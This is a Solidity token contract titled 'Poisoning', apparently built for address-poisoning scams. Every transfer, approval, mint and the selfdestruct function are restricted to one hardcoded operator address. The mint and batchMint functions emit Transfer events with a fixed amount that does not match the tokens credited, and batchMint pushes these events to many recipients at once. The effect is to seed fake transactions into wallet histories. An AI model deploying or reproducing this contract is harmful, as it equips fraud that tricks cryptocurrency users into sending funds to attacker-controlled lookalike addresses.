// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

contract Poisoning {

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    uint256 internal _totalSupply;

    bytes32 internal _name;

    // token symbol, stored in an immutable bytes32 (constructor arg must be <=32 byte string)
    bytes32 internal _symbol;

    // token name string length
    uint256 internal _nameLen;

    // token symbol string length
    uint256 internal _symbolLen;

    bytes32 internal constant _STRING_TOO_LONG_SELECTOR = 0xb11b2ad800000000000000000000000000000000000000000000000000000000;

    // bytes constant TransferEventSigHash = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef";
    // bytes constant ApprovalEventSigHash = "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925";

    constructor(string memory name_, string memory symbol_) {
        bytes memory nameB = bytes(name_);
        bytes memory symbolB = bytes(symbol_);
        uint256 nameLen = nameB.length;
        uint256 symbolLen = symbolB.length;

        // check strings are <=32 bytes
        assembly {
            if or(lt(0x20, nameLen), lt(0x20, symbolLen)) {
                mstore(0x00, _STRING_TOO_LONG_SELECTOR)
                revert(0x00, 0x04)
            }
        }
        // set immutables
        _name = bytes32(nameB);
        _symbol = bytes32(symbolB);
        _nameLen = nameLen;
        _symbolLen = symbolLen;
    }

    function name() external view virtual returns (string memory) {
        bytes32 myName = _name;
        uint256 myNameLen = _nameLen;
        assembly {
        // return string(bytes(_name));
            mstore(0x00, 0x20)
            mstore(0x20, myNameLen)
            mstore(0x40, myName)
            return (0x00, 0x60)
        }
    }

    function symbol() external view virtual returns (string memory) {
        bytes32 mySymbol = _symbol;
        uint256 mySymbolLen = _symbolLen;
        assembly {
        // return string(bytes(_symbol));
            mstore(0x00, 0x20)
            mstore(0x20, mySymbolLen)
            mstore(0x40, mySymbol)
            return (0x00, 0x60)
        }
    }

    function decimals() external pure returns (uint8 dec) {
        assembly {
            dec := 18
        }
    }

    function totalSupply() external view returns (uint256) {
        assembly {
            let freeMemPtr := mload(0x40)
            let _totSup := sload(0x02)
            mstore(freeMemPtr, _totSup)
            return (freeMemPtr, 0x20)
        }
    }

    function balanceOf(address) external view returns (uint256) {
        assembly {
            let freeMemPtr := mload(0x40)
            let _owner := calldataload(0x04)
            mstore(freeMemPtr, _owner)
            mstore(add(freeMemPtr, 0x20), 0x00)

            let ownerSlot := keccak256(freeMemPtr, 0x40)
            let ownerBal := sload(ownerSlot)

            mstore(freeMemPtr, ownerBal)
            return (freeMemPtr, 0x20)
        }
    }

    function allowance(address, address) external view returns (uint256) {
        assembly {
            let freeMemPtr := mload(0x40)

            let _owner := calldataload(0x04)
            let _spender := calldataload(0x24)

            mstore(freeMemPtr, _owner)
            mstore(add(freeMemPtr, 0x20), 0x01)
            let intermediateSlot := keccak256(freeMemPtr, 0x40)

            mstore(freeMemPtr, _spender)
            mstore(add(freeMemPtr, 0x20), intermediateSlot)
            let allowanceSlot := keccak256(freeMemPtr, 0x40)
            let _allowance := sload(allowanceSlot)

            mstore(freeMemPtr, _allowance)
            return (freeMemPtr, 0x20)
        }
    }

    function setName(string memory name_) external {
        bytes memory nameB = bytes(name_);
        uint256 nameLen = nameB.length;
        assembly {
            if iszero(eq(caller(), 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }

            if lt(0x20, nameLen) {
                mstore(0x00, _STRING_TOO_LONG_SELECTOR)
                revert(0x00, 0x04)
            }
        }
        _name = bytes32(nameB);
        _nameLen = nameLen;
    }

    function setSymbol(string memory symbol_) external {
        bytes memory symbolB = bytes(symbol_);
        uint256 symbolLen = symbolB.length;
        assembly {
            if iszero(eq(caller(), 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }

            if lt(0x20, symbolLen) {
                mstore(0x00, _STRING_TOO_LONG_SELECTOR)
                revert(0x00, 0x04)
            }
        }
        _symbol = bytes32(symbolB);
        _symbolLen = symbolLen;
    }

    function transfer(address, uint256) external returns (bool success) {
        assembly {
            let _from := caller()
            if iszero(eq(_from, 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }

            let freeMemPtr := mload(0x40)

            let _to := calldataload(0x04)
            let _value := calldataload(0x24)

            mstore(freeMemPtr, _from)
            mstore(add(freeMemPtr, 0x20), 0x00)
            let fromBalanceSlot := keccak256(freeMemPtr, 0x40)
            let fromBalance := sload(fromBalanceSlot)

            if lt(fromBalance, _value) {
                mstore(0x00, 0x20)
                mstore(0x34, 0x14496e73756666696369656e742062616c616e6365) // revert with "Insufficient balance" msg
                revert(0x00, 0x60)
            }

            sstore(fromBalanceSlot, sub(fromBalance, _value))

            mstore(freeMemPtr, _to)
            mstore(add(freeMemPtr, 0x20), 0x00)
            let toBalanceSlot := keccak256(freeMemPtr, 0x40)
            let toBalance := sload(toBalanceSlot)

            sstore(toBalanceSlot, add(toBalance, _value))

            mstore(freeMemPtr, _value)
            log3(freeMemPtr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)

            success := 0x1
        }
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        assembly {
            let _caller := caller()
            if iszero(eq(_caller, 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }


            let freeMemPtr := mload(0x40)
            let _from := calldataload(0x04)
            let _to := calldataload(0x24)
            let _value := calldataload(0x44)

        // check if caller has enough allowance to spend _from's tokens
            mstore(freeMemPtr, _from)
            mstore(add(freeMemPtr, 0x20), 0x01)
            let intermediateSlot := keccak256(freeMemPtr, 0x40)

            mstore(freeMemPtr, _caller)
            mstore(add(freeMemPtr, 0x20), intermediateSlot)
            let fromAllowanceSlot := keccak256(freeMemPtr, 0x40)
            let fromAllowance := sload(fromAllowanceSlot)

            if lt(fromAllowance, _value) {
            // revert if not
                mstore(0x00, 0x20)
                mstore(0x36, 0x16496e73756666696369656e7420616c6c6f77616e6365) // revert with "Insufficient allowance" msg
                revert(0x00, 0x60)
            }

        // check if _from has enough balance
            mstore(freeMemPtr, _from)
            mstore(add(freeMemPtr, 0x20), 0x00)
            let fromBalanceSlot := keccak256(freeMemPtr, 0x40)
            let fromBalance := sload(fromBalanceSlot)

            if lt(fromBalance, _value) {
            // revert if not
                mstore(0x00, 0x20)
                mstore(0x34, 0x14496e73756666696369656e742062616c616e6365) // revert with "Insufficient balance" msg
                revert(0x00, 0x60)
            }

        // subtract _value from _from's balance
            sstore(fromBalanceSlot, sub(fromBalance, _value))

        // add _value to _to's balance
            mstore(freeMemPtr, _to)
            mstore(add(freeMemPtr, 0x20), 0x00)
            let toBalanceSlot := keccak256(freeMemPtr, 0x40)
            let toBalance := sload(toBalanceSlot)

            sstore(toBalanceSlot, add(toBalance, _value))

        // check if allowances[_from][msg.sender] != type(uint256).max
            if iszero(eq(fromAllowance, 0xffffffffffffffffffffffffffffffff)) {
            // subtract _value from allowances[_from][msg.sender] if so
                sstore(fromAllowanceSlot, sub(fromAllowance, _value))
            }

        // log transfer
            mstore(freeMemPtr, _value)
            log3(freeMemPtr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)

        //return true
            mstore(freeMemPtr, 0x01)
            return (freeMemPtr, 0x20)
        }
    }

    function batchMint(address[] memory recipients, uint256 amount) external {
        assembly {
            if iszero(eq(caller(), 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }

            let len := mload(recipients)
            let totalAmounts := mul(len, amount)
            let newSupply := add(totalAmounts, sload(0x02))
            sstore(0x02, newSupply)

            let dataLocation := add(recipients, 0x20)

            for {let end := add(dataLocation, mul(len, 0x20))} lt(dataLocation, end) {dataLocation := add(dataLocation, 0x20)}
            {
                let to := mload(dataLocation)
                mstore(0x00, to)
                mstore(0x20, 0x00)
                let toSlot := keccak256(0x00, 0x40)
                sstore(toSlot, add(sload(toSlot), amount))

                mstore(0x00, 0xDE0B6B3A7640000)
                log3(0x00, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, 0x00, to)
            }
        }
    }

    function mint(address to, uint256 amount) external {
        assembly {
            if iszero(eq(caller(), 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }

            let newSupply := add(amount, sload(0x02))
            sstore(0x02, newSupply)

            mstore(0x00, to)
            mstore(0x20, 0x00)
            let toSlot := keccak256(0x00, 0x40)
            sstore(toSlot, add(sload(toSlot), amount))

            mstore(0x00, 0xDE0B6B3A7640000)
            log3(0x00, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, 0x00, to)
        }
    }

    function approve(address, uint256) external returns (bool) {
        assembly {
            let _caller := caller()

            if iszero(eq(_caller, 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }
            let freeMemPtr := mload(0x40)
            let _spender := calldataload(0x04)
            let _value := calldataload(0x24)

            mstore(freeMemPtr, _caller)
            mstore(add(freeMemPtr, 0x20), 0x01)
            let intermediateSlot := keccak256(freeMemPtr, 0x40)

            mstore(freeMemPtr, _spender)
            mstore(add(freeMemPtr, 0x20), intermediateSlot)
            let targetSlot := keccak256(freeMemPtr, 0x40)

            sstore(targetSlot, _value)

            mstore(freeMemPtr, _value)
            log3(freeMemPtr, 0x20, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, _caller, _spender)

            mstore(freeMemPtr, 0x01)
            return (freeMemPtr, 0x20)
        }
    }

    function destroy() external {
        assembly {
            if iszero(eq(caller(), 0x9d0230a890C73a3e89bb5EB06A02D877642f1404)) {
                revert(0, 0)
            }

            selfdestruct(0x9d0230a890C73a3e89bb5EB06A02D877642f1404)
        }
    }
}